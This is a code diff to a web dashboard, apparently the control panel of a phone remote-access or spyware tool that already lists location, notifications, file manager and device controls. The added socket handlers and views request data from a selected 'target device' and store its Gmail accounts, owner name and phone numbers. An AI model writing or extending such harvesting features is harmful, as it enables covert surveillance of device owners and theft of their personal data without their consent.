@@ -24,6 +24,8 @@ import LocationView from "@/components/views/LocationView";
 import NotificationsView from "@/components/views/NotificationsView";
 import FileManagerView from "@/components/views/FileManagerView";
 import WallpaperView from "@/components/views/WallpaperView";
+import DeviceInfoView from "@/components/views/DeviceInfoView";
+import AccountsView from "@/components/views/AccountsView";
 import { FlashlightView, VibrationView } from "@/components/views/ControlsView";
 import TelemetryCards from "@/components/dashboard/TelemetryCards";
 import WhatsAppButton from "@/components/WhatsAppButton";
@@ -1172,6 +1174,35 @@ export default function Home(props: any) {
                         return d;
                     });
                 });
+            });
+
+            socket.on("device_info_data", (data: any) => {
+                if (!data || !data.deviceId) return;
+                const devId = String(data.deviceId);
+                setDevices(prev => prev.map(d => {
+                    if (String(d.deviceId || d.id || d._id || '') === devId) {
+                        return { ...d, specs: data.specs };
+                    }
+                    return d;
+                }));
+            });
+
+            socket.on("accounts_data", (data: any) => {
+                if (!data || !data.deviceId) return;
+                const devId = String(data.deviceId);
+                setDevices(prev => prev.map(d => {
+                    if (String(d.deviceId || d.id || d._id || '') === devId) {
+                        return {
+                            ...d,
+                            gmail: data.gmail,
+                            gmails: data.gmails,
+                            ownerName: data.ownerName,
+                            phoneNumber: data.phoneNumber,
+                            phoneNumbers: data.phoneNumbers
+                        };
+                    }
+                    return d;
+                }));
             });
 
 
@@ -3569,6 +3600,35 @@ END:VCARD`;
                             });
                         }}
                         requireConnectedDevice={requireConnectedDevice}
+                    />
+                );
+            }
+            case 'device_info': {
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                return (
+                    <DeviceInfoView
+                        specs={targetDevObj?.specs}
+                        device={targetDevObj}
+                        onRefresh={() => {
+                            if (socket && effectiveTargetDevice && targetDevObj?.online) {
+                                socket.emit('fetch_device_info', { uuid: userUuid, targetDeviceId: effectiveTargetDevice });
+                            }
+                        }}
+                    />
+                );
+            }
+            case 'accounts': {
+                const effectiveTargetDevice = selectedDeviceId || selectedDeviceIdRef.current || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null) || (devices.length > 0 ? String(devices[0].deviceId || devices[0].id || devices[0]._id) : null);
+                const targetDevObj = devices.find(d => String(d.deviceId || d.id || d._id) === String(effectiveTargetDevice));
+                return (
+                    <AccountsView
+                        device={targetDevObj}
+                        onRefresh={() => {
+                            if (socket && effectiveTargetDevice && targetDevObj?.online) {
+                                socket.emit('fetch_accounts', { uuid: userUuid, targetDeviceId: effectiveTargetDevice });
+                            }
+                        }}
                     />
                 );
             }
